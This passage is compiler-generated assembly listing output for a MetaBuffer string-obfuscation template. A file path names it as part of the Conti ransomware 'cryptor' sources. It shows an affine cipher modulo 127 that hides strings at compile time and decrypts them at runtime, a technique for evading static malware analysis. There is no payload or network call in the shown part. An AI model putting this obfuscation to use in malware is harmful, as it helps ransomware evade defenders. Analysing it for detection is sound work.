  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  008bd	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  008c1	88 85 c0 00 00
	00		 mov	 BYTE PTR tv462[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  008c7	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  008ce	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  008d5	5f		 pop	 rdi
  008d6	5d		 pop	 rbp
  008d7	c3		 ret	 0
??0?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<53,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 7d	 sub	 eax, 125		; 0000007dH
  0002d	6b c0 33	 imul	 eax, eax, 51		; 00000033H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 05	 imul	 eax, eax, 5
  0002d	83 c0 7d	 add	 eax, 125		; 0000007dH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 26	 cmp	 QWORD PTR i$1[rbp], 38	; 00000026H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv364 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z ; MetaBuffer<5,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
